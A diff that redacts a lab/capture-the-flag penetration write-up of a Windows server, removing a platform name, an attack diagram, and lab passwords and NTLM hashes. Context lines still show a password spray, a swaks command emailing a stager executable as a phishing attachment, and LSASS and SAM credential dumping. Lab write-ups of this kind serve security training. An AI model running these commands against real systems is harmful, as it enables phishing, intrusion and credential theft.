@@ -12,7 +12,6 @@ tags: ["windows", "smtp", "phishing", "av-evasion", "godpotato", "seimpersonate"
 
 ## Overview
 
-**Platform:** HackSmarter
 **Difficulty:** Medium
 **IP:** 10.0.29.31
 
@@ -45,41 +44,6 @@ The engagement identified critical vulnerabilities:
 - **Local SAM database extraction** exposing all local account hashes
 
 **Risk Rating:** High
-
----
-
-## Attack Path Overview
-
-```
-┌─────────────────────────────────────────────────────────────────┐
-│     SMB Enumeration → docs Share → User Discovery               │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     Password Guessing → roger:NewUser2025! → SMTP Auth          │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     Phishing via SWAKS → Go Stager → Shell as alfonso           │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     Writable wwwroot → ASPX Shell → IIS AppPool Context         │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     GodPotato → Disable AV → SYSTEM Shell                       │
-└─────────────────────────────────────────────────────────────────┘
-                              │
-                              ▼
-┌─────────────────────────────────────────────────────────────────┐
-│     Mimikatz SAM Dump → Administrator Hash → Full Compromise    │
-└─────────────────────────────────────────────────────────────────┘
-```
 
 ---
 
@@ -186,14 +150,14 @@ Alfonso
 ```
 For new users:
 
-Please set them up with the default password of NewUser2024!
+Please set them up with the default password of [REDACTED]
 
 Sincerely,
 Roger
 ```
 
 **Users Identified:** `roger`, `alfonso`
-**Default Password:** `NewUser2024!`
+**Default Password:** `[REDACTED]`
 
 ## 1.5 RID Brute Force
 
@@ -224,12 +188,12 @@ nxc smb 10.0.29.31 -u users.txt -p passwords.txt
 ```
 
 ```
-SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\roger:NewUser2024! STATUS_LOGON_FAILURE
-SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\alfonso:NewUser2024! STATUS_LOGON_FAILURE
-SMB  10.0.29.31  445  WINSERVER01  [+] Winserver01\roger:NewUser2025!
+SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\roger:[REDACTED] STATUS_LOGON_FAILURE
+SMB  10.0.29.31  445  WINSERVER01  [-] Winserver01\alfonso:[REDACTED] STATUS_LOGON_FAILURE
+SMB  10.0.29.31  445  WINSERVER01  [+] Winserver01\roger:[REDACTED]
 ```
 
-**Valid Credentials:** `roger:NewUser2025!`
+**Valid Credentials:** `roger:[REDACTED]`
 
 ## 2.2 POP3 Access Verification
 
@@ -241,7 +205,7 @@ telnet 10.0.29.31 110
 +OK POP3
 USER roger@winserver01.hs
 +OK Send your password
-PASS NewUser2025!
+PASS [REDACTED]
 +OK Mailbox locked and ready
 LIST
 +OK 0 messages (0 octets)
@@ -285,7 +249,7 @@ swaks --to 'alfonso@winserver01.hs' --from 'roger@winserver01.hs' \
   --server winserver01.hs --port 25 \
   --timeout 20s --auth LOGIN \
   --auth-user 'roger@winserver01.hs' \
-  --auth-password 'NewUser2025!' \
+  --auth-password '[REDACTED]' \
   --attach @stager.exe
 ```
 
@@ -426,7 +390,7 @@ python3 -m pypykatz lsa minidump lssas.dmp
 ```
 Username: alfonso
 Domain: WINSERVER01
-NT: f3c1fe6280bd6f3bd8bbe39491b97439
+NT: [HASH REDACTED]
 ```
 
 ## 4.2 SAM Database Extraction
@@ -439,20 +403,20 @@ Mimikatz provides the Administrator hash:
 
 ```
 Domain : WINSERVER01
-SysKey : e7083307e93d372584854070f734ae21
+SysKey : [HASH REDACTED]
 Local SID : S-1-5-21-875136113-1806174397-556431496
 
 RID  : 000001f4 (500)
 User : Administrator
-  Hash NTLM: 4366ec0f86e29be2a4a5e87a1ba922ec
+  Hash NTLM: [HASH REDACTED]
 
 RID  : 000003e8 (1000)
 User : alfonso
-  Hash NTLM: f3c1fe6280bd6f3bd8bbe39491b97439
+  Hash NTLM: [HASH REDACTED]
 
 RID  : 000003e9 (1001)
 User : roger
-  Hash NTLM: ac54562d17d839edab4495ae6d2e11eb
+  Hash NTLM: [HASH REDACTED]
 ```
 
 ## 4.3 KeePass Database Access
@@ -468,14 +432,14 @@ With Administrator access via RDP, the KeePass database could be accessed using 
 ```
 Phase 1-2 - Enumeration & Initial Access
 ────────────────────────────────────────────────────────────────
-roger            : NewUser2025!           → SMTP/POP3 access
+roger            : [REDACTED]           → SMTP/POP3 access
 alfonso          : [Phishing victim]      → Initial shell
 
 Phase 3-4 - Privilege Escalation & Post-Exploitation
 ────────────────────────────────────────────────────────────────
-alfonso          : f3c1fe6280bd6f3bd8bbe39491b97439 (NTLM)
-roger            : ac54562d17d839edab4495ae6d2e11eb (NTLM)
-Administrator    : 4366ec0f86e29be2a4a5e87a1ba922ec (NTLM)
+alfonso          : [HASH REDACTED] (NTLM)
+roger            : [HASH REDACTED] (NTLM)
+Administrator    : [HASH REDACTED] (NTLM)
 ```
 
 ---
